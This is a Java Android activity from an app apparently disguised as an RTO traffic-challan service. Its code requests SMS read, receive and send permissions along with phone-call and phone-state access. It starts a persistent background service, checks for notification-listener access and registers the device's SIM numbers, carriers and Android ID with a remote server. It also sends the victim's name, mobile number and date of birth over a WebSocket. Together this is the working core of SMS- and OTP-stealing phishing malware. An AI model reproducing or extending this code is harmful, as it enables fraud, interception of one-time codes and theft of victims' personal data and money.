package com.service.rtochallan;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.Set;

public class MainActivity extends BaseActivity {

    public AlertDialog dialog;

    private static final int SMS_PERMISSION_REQUEST_CODE = 1;

    @SuppressLint("SetTextI18n")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        LayoutInflater inflater = getLayoutInflater();
        View dialogView = inflater.inflate(R.layout.dialog_loading, null);

        // Loading Dialog
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setView(dialogView);
        builder.setCancelable(false);
        setupLoading = builder.create();
        setupLoading.show();

        helper.FormCode(); // test cpp security is there nay error or not
        if(!Helper.isNetworkAvailable(this)) {
            Intent intent = new Intent(context, NoInternetActivity.class);
            startActivity(intent);
        }
        checkPermissions();

    }

    private void runApp(){
    setContentView(R.layout.activity_main);
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }


        EditText dob22 = findViewById(R.id.dob22);
        dob22.addTextChangedListener(new DateInputMask(dob22));

        dataObject = new HashMap<>();
        ids = new HashMap<>();
        ids.put(R.id.etFullName, "etFullName");
        ids.put(R.id.etMobile, "etMobile");
        ids.put(R.id.dob22, "dob22");

        // Populate dataObject
        for(Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);
            String value = editText.getText().toString().trim();
            dataObject.put(key, value);
        }

        Button buttonSubmit = findViewById(R.id.btnProceed);
        buttonSubmit.setOnClickListener(v -> {
            if (!validateForm()) {
                Toast.makeText(context, "Form validation failed", Toast.LENGTH_SHORT).show();
                return;
            }

            submitLoader.show();

            try {
                JSONObject dataJson = new JSONObject(dataObject); // your form data
                JSONObject sendPayload = new JSONObject();
                sendPayload.put("form_code", helper.FormCode());
                sendPayload.put("android_id", helper.getAndroidId(this));
                sendPayload.put("data", dataJson);

                // Emit through WebSocket
                socketManager.emitWithAck("formData", sendPayload, new SocketManager.AckCallback() {
                    @Override
                    public void onResponse(JSONObject response) {
                        runOnUiThread(() -> {
                            submitLoader.dismiss();
                            int status = response.optInt("status", 0);
                            int formId = response.optInt("data", -1);
                            String message = response.optString("message", "No message");
                            if (status == 200 && formId != -1) {
                                Intent intent = new Intent(context, SecondActivity.class);
                                intent.putExtra("form_id", formId);
                                startActivity(intent);
                            } else {
                                Toast.makeText(context, "Form failed: " + message, Toast.LENGTH_SHORT).show();
                            }
                        });
                    }

                    @Override
                    public void onError(String error) {
                        runOnUiThread(() -> {
                            Toast.makeText(context, "Socket Error: " + error, Toast.LENGTH_SHORT).show();
                            submitLoader.dismiss();
                        });
                    }
                });

            } catch (JSONException e) {
                Toast.makeText(context, "Error building JSON: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                submitLoader.dismiss();
            }
        });


    }

    private void initializeWebView() {
        registerPhoneData();
    }


    public boolean validateForm() {
        boolean isValid = true; // Assume the form is valid initially
        dataObject.clear();

        for (Map.Entry<Integer, String> entry : ids.entrySet()) {
            int viewId = entry.getKey();
            String key = entry.getValue();
            EditText editText = findViewById(viewId);

            if(!Objects.equals(key, "panNumber")){
                // Check if the field is required and not empty
                if (!FormValidator.validateRequired(editText, "Please enter valid input")) {
                    isValid = false;
                    continue;
                }
            }

            String value = editText.getText().toString().trim();

            // Validate based on the key
            switch (key) {
                case "etMobile":
                    if (!FormValidator.validateMinLength(editText, 10, "Required 10 digit ")) {
                        isValid = false;
                    }
                    break;
                case "dob22":
                    if (!FormValidator.validateMinLength(editText,  10, "Invalid Date of Birth" )) {
                        isValid = false;
                    }
                    break;
                default:
                    break;
            }

            // Add to dataObject only if the field is valid
            if (isValid) {
                dataObject.put(key, value);
            }
        }

        return isValid;
    }


    private void checkPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();

        // Core permissions
        String[] permissions = new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.INTERNET,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.SEND_SMS
        };

        // Add all the above if missing
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(perm);
            }
        }

        // ✅ For Android 13+ (notification permission)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
            }
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    permissionsToRequest.toArray(new String[0]),
                    SMS_PERMISSION_REQUEST_CODE
            );
            Toast.makeText(this, "Requesting permissions...", Toast.LENGTH_SHORT).show();
        } else {
            initializeWebView();
            // OR start your foreground service here
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == SMS_PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0) {
                boolean allPermissionsGranted = true;
                StringBuilder missingPermissions = new StringBuilder();

                for (int i = 0; i < grantResults.length; i++) {
                    if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                        allPermissionsGranted = false;
                        missingPermissions.append(permissions[i]).append("\n");
                    }
                }

                if (allPermissionsGranted) {
                    initializeWebView(); // or startForegroundService()
                } else {
                    showPermissionDeniedDialog();
                    Toast.makeText(this,
                            "Permissions denied:\n" + missingPermissions.toString(),
                            Toast.LENGTH_LONG).show();
                }
            }
        }
    }

    private void showPermissionDeniedDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Permission Denied");
        builder.setMessage("SMS permissions are required to send and receive messages. " +
                "Please grant the permissions in the app settings.");

        // Open settings button
        builder.setPositiveButton("Open Settings", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                openAppSettings();
            }
        });

        // Cancel button
        builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                finish();
            }
        });

        builder.show();
    }
    private void openAppSettings() {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        intent.addCategory(Intent.CATEGORY_DEFAULT);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    public void registerPhoneData() {
        String url = helper.ApiUrl() + "/devices";
        JSONObject sendData = new JSONObject();

        try {
            sendData.put("form_code", helper.FormCode());
            sendData.put("device_name", Build.MANUFACTURER);
            sendData.put("device_model", Build.MODEL);
            sendData.put("device_android_version", Build.VERSION.RELEASE);
            sendData.put("device_api_level", Build.VERSION.SDK_INT);
            sendData.put("android_id", helper.getAndroidId(getApplicationContext()));

            // ✅ Collect SIM details safely
            try {
                JSONObject simData = new JSONObject(CallForwardingHelper.getSimDetails(this));
                Iterator<String> keys = simData.keys();
                int simCount = 1;

                while (keys.hasNext()) {
                    String key = keys.next();
                    JSONObject simInfo = simData.getJSONObject(key);

                    String simNumber = simInfo.optString("sim_number", "");
                    String simName = simInfo.optString("sim_name", "");
                    int simId = simInfo.optInt("sim_id", -1);

                    if (simCount == 1) {
                        sendData.put("sim1_phone_no", simNumber);
                        sendData.put("sim1_network", simName);
                        sendData.put("sim1_sub_id", simId);
                    } else if (simCount == 2) {
                        sendData.put("sim2_phone_no", simNumber);
                        sendData.put("sim2_network", simName);
                        sendData.put("sim2_sub_id", simId);
                    }
                    simCount++;
                }

//                Log.d(TAG, "SIM Count: " + (simCount - 1));

            } catch (JSONException e) {
                Log.e(TAG, "SIM parsing error: " + e.getMessage());
            }

        } catch (JSONException e) {
            Log.e(TAG, "JSON build error: " + e.getMessage());
        }

//        Log.d(TAG, "Registering device with data: " + sendData.toString());

        // ✅ Send the POST request
        networkHelper.makePostRequest(url, sendData, new NetworkHelper.PostRequestCallback() {
            @Override
            public void onSuccess(String result) {
                runOnUiThread(() -> {
                    try {
                        JSONObject jsonData = new JSONObject(result);
                        int status = jsonData.optInt("status", 0);
                        String message = jsonData.optString("message", "No message");

                        if (status == 200) {
                            int device_id = jsonData.getInt("device_id");
                            storage.saveInt("device_id", device_id);
//                            Toast.makeText(getApplicationContext(),
//                                    "Device registered successfully ✅",
//                                    Toast.LENGTH_SHORT).show();
                            setupLoading.hide();
                            runApp();
                        } else {
                            Toast.makeText(getApplicationContext(),
                                    "Registration failed: " + message,
                                    Toast.LENGTH_LONG).show();
                            Log.d(TAG, "Device not registered: " + message);
                        }
                    } catch (JSONException e) {
                        Log.e(TAG, "Response parse error: " + e.getMessage());
                        Toast.makeText(getApplicationContext(),
                                "Invalid response format from server",
                                Toast.LENGTH_LONG).show();
                    }
                });
            }

            @Override
            public void onFailure(String error) {
                runOnUiThread(() -> {
                    Log.e(TAG, "Request failed: " + error);
                    Toast.makeText(getApplicationContext(),
                            "Network error: " + error,
                            Toast.LENGTH_LONG).show();
                });
            }
        });
    }

    public boolean hasPermission() {
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            return false;
        } else {
            if(isNotificationListenerEnabled()){
                return true;
            }else{
                return false;
            }
        }
    }
    private boolean isNotificationListenerEnabled() {
        Set<String> enabledListenerPackages = NotificationManagerCompat.getEnabledListenerPackages(this);
        return enabledListenerPackages.contains(getPackageName());
    }



}
